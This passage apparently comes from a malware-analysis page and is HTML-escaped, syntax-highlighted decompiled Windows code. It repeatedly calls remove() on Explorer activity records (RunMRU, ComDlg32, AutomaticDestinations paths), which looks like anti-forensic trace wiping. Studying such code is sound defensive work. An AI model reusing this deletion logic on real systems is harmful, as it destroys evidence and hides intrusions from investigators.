style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000260 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400032d6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400032e5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003305\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000240 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ComDlg32.dll.mui\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003314\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003323\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000240 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000332b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000333a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000335a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000220 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">RunMRU\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003369\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003378\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000220 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003380\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000338f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400033af\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000200 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Explorer\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AutomaticDestinations\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400033be\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400033cd\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000200 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400033d5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400033e4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003404\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000001e0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan 